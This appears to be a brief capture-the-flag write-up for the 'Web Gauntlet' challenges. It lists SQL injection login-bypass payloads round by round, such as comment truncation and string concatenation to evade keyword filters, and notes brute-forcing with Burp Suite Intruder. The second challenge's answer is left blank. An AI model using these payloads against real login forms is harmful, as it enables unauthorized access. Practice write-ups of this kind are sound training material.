# Web Gauntlet

![image.png](Images/wb0.png)

Round 1: `admin' --` 

Filter: `or`

![image.png](Images/wb1.png)

Round 2: `admin'/*` 

Filter: `or and like = --`

I used intruder option in Burpsuite to brute force the injections.

![image.png](Images/wb2.png)

Round 3: `admin'/*`

Filter: `or and = like > < --`

Round 4: `ad'||'min'/*`

Filter: `or and = like > < -- admin`

Round 5: `ad'||'min'/*`

Filter: `or and = like > < -- union admin`

Possible answer: `ad'||'min';`

# Web Gauntlet 2

Answer: 

Filter: `or and true false union like = > < ; -- /* */ admin`